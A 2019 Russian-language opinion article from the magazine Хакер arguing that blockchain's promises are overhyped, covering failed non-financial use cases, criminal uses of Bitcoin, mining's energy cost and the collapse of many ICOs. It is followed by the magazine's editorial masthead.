 — Владимир Тимофеев



КРИПТОШУМИХА И ВЗЛЕТ BITCOIN
Началась вся эта история не вчера и не год назад. Разговоры о криптовалю‐
тах ведутся еще с девянос тых годов, а зна менитая работа Bitcoin: A Peer‐to‐
Peer  Electronic Cash System  (PDF), подписанная  псевдонимом Сатоси
Накамото, вышла в мае 2009 года.
   Кто такой загадоч ный Накамото, никто не знает до сих пор, но время
от времени сообщество находит очередного потенциального кандидата:
от ни в чем не повин ного японского пенсионера Дориана Накамото, которо‐
му потом еле удалось отбить ся от прес сы, до главы наркокартеля Пола Ле Ру,
который, кстати, заодно считается авто ром TrueCrypt. Также под подозрени‐
ем — Ник Сабо, изоб ретатель предшественника Bitcoin под названием Bit
Gold, и Крейг Райт, который, кажется, как раз очень хотел, чтобы все думали,
что Накамото — это он.
   Ну и, конечно, пока одни мечтают, что криптовалюты сделают традици‐
онные финансовые системы ненужными и избавят человечество от гнета
государств, другие уверены, что Bitcoin — это наоборот проект американских
спецслужб и он лишь укрепит финансовые позиции США.
   Так или иначе, c 2012 года Bitcoin начал плавно, но уве ренно расти
и к 2017 году добрался отметки в $800. И тут слу чился первый стремительный
взлет — всего за год стоимость бит кой на дос тигла рекордного значения поч‐
ти в 20 тысяч долларов. Майнинг, уже считавшийся нерентабельным, внезап‐
но стал снова казаться выгодным, а заодно взлетели другие криптовалюты.
Да что там взлетели — многие как раз тогда и появи лись.


             INFO

                        «Хакер» тоже неод нократно писал о блокчейне,
                       криптовалютах  и  майнинге,  приложив  руку
                          к шумихе. На дан ный момент этой теме пос‐
                     вящено уже четыре темы номера: «Как крадут
                      ICO», «Майнинг крип товалют», «Краткий экскурс
                        в Ethereum» и «Все о Bitcoin».


Сейчас, в 2019 году уже не так важно, с чего всё началось. Куда важнее
понять, как отличить мошенников, которы ми кишит эта индустрия, от тех, кто
хотя бы пытается сделать что‐то реальное. А еще лучше было бы понять, дей‐
ствительно ли блокчейн так полезен, как об этом говорят.


БЛОКЧЕЙН НЕ ДЛЯ ДЕНЕГ
Одной из характерных примет криптовалютного бума стали многочисленные
попытки применить технологию блокчейна не для денежных переводов, а для
чего‐то другого. И правда: кажется, что распределенная кни га уче та, записи
в которой нельзя подделать, может иметь примене ние в самых разных
областях. Именно на этой идее и стро илась львиная доля криптостартапов.
  Иван Иваницкий из компании SmartDec в своей заметке «Вам не нужен
блокчейн: восемь популярных применений и почему они не работают» ставит
каждую из этих идей под сомнение. Далее я по возможности резюмирую
семь из восьми перечисленных примеров, а к восьмому мы вернемся чуть
позже.
 • Управле ние поставками — использование блокчейна для подтвержде‐
   ния того, что выполняются, например, условия транспортировки. Главная
   проблема, которую здесь нужно решить — достоверность данных, пос‐
   тупающих с датчиков. Обмануть их очень легко, и блокчейн здесь никак
   не помогает.
 • Под твержде ние  под линности  товаров.  Если  снабжать  ценные
   товары метками, которые можно проверить через блокчейн, то это в
   теории сделает подделки невоз можными. В реальности, украв ори гинал,
   злоумышленник, засевший в цепи поставки, может дальше передать под‐
   делку с копией метки.
 • Гаран тия под линности утвержде ния. Например, нам нужно под твер‐
   дить, что дип лом действитель но выдан универ ситетом. Здесь, в принципе,
   достаточно элек тронной подписи, основанной на ассиметричной крип‐
   тографии. Хотя блокчейн при желании можно использовать в качестве
   наиболее надежного спо соба подтвердить время подписи.
 • Го лосо вание. Снова похожая история: во‐первых, криптография с при‐
   ватным ключом уже решает техническую проб лему, во‐вторых, ее всё рав‐
   но недостаточно. Нужно подтвердить подлинность самого голосующе го
   и обеспечить надежность создания и хранения ключа. Также в нынешних
   реализациях голосование на блокчей не исклю чительно откры тое, а это
   не всегда желательно.
 • Под твержде ние авторства. Создатель художественного произведения
  может закрепить права на свое тво рение при помощи блокчейна. Это дей‐
   ствительно так, но есть два «но»: во‐первых, такая сис тема дол жна быть
  широко распространена, во‐вторых, шедевр в теории кто‐то может успеть
   скопировать и зарегистрировать копию первым.
 • Зе мельные кадастры. Казалось бы, хорошая идея хранить данные
  о собственности на землю в распределен ном реестре, защищенном
   от подделок. Но тут моментально воз никают трения с государс твенными
   механизмами. Что если государс тво решит изъять землю, а нынешний
   владелец не захочет или не сможет сделать запись о передаче? Если же
   разрешить вносить принудительные изменения, то плюсы блокчейна
   исчезнут, а минусы оста нутся.
 • Пе рево ды меж ду бан ками. Банки могли бы рассчитываться друг
   с другом через блокчейн, но обычно такие переводы не придаются
   огласке.  Единственный  вариант:  если финансовые  институты  будут
   использовать свой закрытый блокчейн. Получит ся, правда, что разница
   с распределен ной базой данных только в том, что учас тники могут
   не доверять друг другу. Но любые претензии всё равно придется решать
   через суд, так что от блокчейна опять мало пользы.

Я думаю, ты уже уло вил общие черты, которые объединяют большинство пун‐
ктов. Там, где блокчейн пересекается с реальностью, неизменно всплывают
нестыковки либо с физичес кими огра ничениями, либо с существу ющими (и
гораздо более продуманными с точки зрения интегра ции) механизмами. Все
это не значит, что блокчейн бесполезен, но показывает, нас колько в реаль‐
ности сложно получить ту универсальную пользу, которую обещают его апо‐
логеты.


ГРЯЗНЫЕ ДЕНЬГИ
Главный козырь блокчейна — это всё же денеж ные переводы, и здесь
перед нами действительно есть неоспоримые при меры того, что эта тех‐
нология работает. Bitcoin, Litecoin, Zcash и некоторые альткой ны успешно
используются для оплаты товаров и услуг.
  К сожалению, и тут не всё гладко. Стоит начать вспоминать примеры,
и оказывается, что они по большей части криминальные. Наркотики, поддель‐
ные документы, ворованные кредитки, эксплоит‐киты, оплата вре дительской
деятельности разного рода — от спама, накрутки и DDoS до взлома.
Как вариант — отмывание денег, полученных в ходе других нелегальных
активностей, и оплата выкупов вла дельцам криптолокеров. Если бы не было
Bitcoin, не было бы и волны вымога тельского ПО.
  Ничего  удивительного  здесь,  конечно,  нет. Пол ностью  электронная
валюта, переводы в которой можно анонимизировать, неизменно привлекает
тех, кто в этой анонимности нуждается. Та же ситу ация, например, со «скры‐
тыми сервисами» Tor: там пря чут ся в основном те, у кого нет вариантов, кро‐
ме как прятаться.
  Писатель‐фантаст Чарли Стросс в сво ей заметке «Почему я бы хотел, что‐
бы Bitcoin горел в огне» сделал попытку заг лянуть в самую суть этой проб‐
лемы:

       Bitcoin выглядит так, буд то его соз давали как ору жие, нацеленное
      на раз рушение центра лизованной банков ской сис темы, с либер тари-
      анской повес ткой в голове: усложнить сбор налогов и отсле жива ние
     финансовых транзакций граждан. Все это хорошо, если ты либер тари-
      анец, но  я придер жива юсь мне ния,  что либер тарианс тво —  это
       как ленинизм: потряса ющая и целос тная политичес кая теория с неп-
      лохими аргу ментами в основе, которая, к сожале нию, дает нере алис-
      тичные советы об управле нии общес твом. Они сра бота ют только если
      заменить гряз ных людишек на сфе ричес ких гуманоидов рав номер ной
      плотности, — пос кольку теории эти основыва ются на упрощенных
      утвер жде ниях о челове чес ком поведе нии, которые, увы, невер ны.

Стросс при этом вовсе не утверждает, что нынеш ние капиталистические
механизмы хороши, прос то считает, что криптовалю ты и сопутствующая им
идеология еще хуже. «Это как поменять заусенцы на гангрену», — резюми‐
рует он.


РАСХОД ЭЛЕКТРИЧЕСТВА
Есть и более приземленные претензии к Bitcoin и схожим криптовалютам.
Одна из них — огромные затраты электроэнергии, которая тратится на май‐
нинг и расходуется, по сути, впус тую.
   Авторы отчета, опубликованного на сайте Digiconomist, пришли к выводу,
что майнинг одного только  Bitcoin тратит боль ше электроэнергии, чем
некоторые страны (например, Австрия или Чехия), а энергии, которая уходит
на одну транзакцию, хватило бы, чтобы обеспечить средний американский
дом электричеством в течение 20 дней.





  График энергозатрат на майнинг в тераватт‐часах. Красная
  линия — расчетное потребление, пунктир — минимальное

Более новые криптовалюты превос ходят Bitcoin по скорости проведе ния
транзакций и энергоэф фективности. Однако в этом плане, кажется, предсто‐
ит еще большой прогресс, прежде чем какими‐нибудь койнами можно будет
действительно заменить все банковские транзакции.


Ситу ация в Рос сии
В нашей  стране один  из самых дешевых тарифов на  электричество
для населения находится в Иркутской области. Произошло это из‐за того, что
некогда единую энергосистему РСФСР разделили, и каскад гидроэлектрос‐
танций, находящихся в Иркутской области, не вошел в уже канувший в лету
РАО ЕЭС.
   Такое большое количество электроэнергии требуется для производства
не крипты, как многие вдруг решили, а алюминия. В Сибири у UC Rusal рас‐
положены Новокузнецкий, Саяногорский, Хакасский, Красноярский, Иркут‐
ский и Братский алюминиевые заводы. Если бы хозяева Русала не взяли
под контроль производс тво электроэнергии в регионе, производить алю‐
миний стало бы экономичес ки невыгодно.
  Выгодные тарифы на электро энергию вовсю использует мес тный малый
бизнес, в том числе и майнеры. Для сравнения в сосед нем от Иркутской
области регионе ‐ Бурятии, тариф для населения выше в четыре раза (рубль
против четырех).
 — Владимир Тимофеев



ICO: КЛАДБИЩЕ ПРОЕКТОВ
Когда мы говорили о применениях блокчейна не для денег, я нарочно отло‐
жил на потом последний, восьмой пункт из статьи Иваницкого. Пункт этот
посвящен ICO.
   Если ты упустил всю шумиху вокруг этой концепции, то вкратце она озна‐
чает выпуск токенов, которые сами по себе обычно никак не используются,
но служат подтверждением того, что ты вложил деньги в тот или иной проект.
Токенами можно торговать, и, если про ект будет расти и здравствовать, то
они должны дорожать.
   Эта схема очень напоминает размещение акций на биржах. С той раз‐
ницей, что ICO не опираются на традиционные финансовые институты и не
регулируются законодательно. Это многое упро щает, но и проблемы тоже
быстро стали очевидны.
  На сайте Blockchain Graveyard («Блокчейновое кладбище») собрана кол‐
лекция из 68 инцидентов, связанных с ICO. Некоторые провалились вследс‐
твие сбоев, но большинство — из‐за уязвимос тей в механизме выпуска
токенов, краж, постыдной утери ключей от облачного хранилища и мошен‐
ничества. И, конечно, зачас тую нас тоящие причины прос то не сообщается.
«Простите, проект закрыт, ваши деньги похитили злые хакеры, пока‐пока!»


             INFO

                 О том, как пал DAO — один из крупнейших про‐
                        ектов за исто рию крип товалют, читай в статье
                            «Распределенное    авто номное    ограбление.
                       Как хакер разорил главный крип товалютный про‐
                         ект года».


В общем, блокчейн сам по себе никак не защищает вкладчиков от обмана,
да и успех самого мероприятия, в которое вкладывают деньги, зачастую
под  большим  вопросом.  Сделать  выход  на  биржу  дос тупным  каж‐
дому — блестящая идея. Но точно так же, как принимать Bitcoin первыми бро‐
сились наркоторговцы и кардеры, за ICO сразу же ухватились мошенники
и авантюристы.


ЗДРАВОЕ ЗЕРНО
Итак, какой из всего это го можно сделать вывод? Не пойми меня неправиль‐
но: я вовсе не считаю, что блокчейн обречен на провал, а криптовалюты
никогда не заменят обычные день ги. Даже ICO при более продуманном
исполнении могут принес ти мас су пользы.
  Просто новейшим технологиям свойственно захватывать умы гораз до
раньше, чем на их основе можно будет сделать что‐то применимое в пов‐
седневной жизни. А в случае с криптовалютами и ICO специфика такова, что
в полусырую технологию вдруг оказалось возможно сразу же инвестировать
деньги, причем в частном порядке. Слу хи о быс тром обогащении сразу же
вывели исте рию на какие‐то зап редельные уровни, а аферисты облепили эту
тему так плотно, что доб рое и вечное начисто перес тало проглядываться.
  В заметке «The Blockchain Bubble will Pop, What Next?» («Пузырь блокчейна
лопнет, что придет на смену?») Захари Липтон дает, пожалуй, наиболее взве‐
шенную оценку ситуации:

      Точ но так же, как было с бир жевым кра хом 1929 года и кра хом дот-
      комов в 1999  году, я полагаю, будет и с крип товалю тами. Рано
      или поз дно пузырь лоп нет. Но крах доткомов смирил инвесторов
      и снизил оценки стоимос ти ком паний. А потом на мес те пузыря воз-
      ник  гораз до  более  здра вый  климат,  в  котором  проц вета ет
      интернет‑биз нес.   Сегод ня   7   из   10   круп нейших   ком паний
      в мире — технологичес кие. Так что рынок тогда вов се не пере оце нил
      интернет, он пере оце нил только  тогдашний урожай пред принима-
      телей. По‑прежнему оста ется откры тым воп рос о том, каким будет
     эффект от технологий, основанных на блок чейне, пос ле того, как цирк
       уедет.

И действительно: несмотря на казалось бы пол ное разочарование, в которое
криптовалютный рынок загнал себя в 2018 году, не прошло и года, и мы снова
обсуждаем проекты вроде TON и Libra. Даже курс Bitcoin пос тепенно вер‐
нулся к уровню конца 2017 года. Так что будут еще новые взлеты и — можешь
не сомневаться — новые падения.
   №08 (245)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019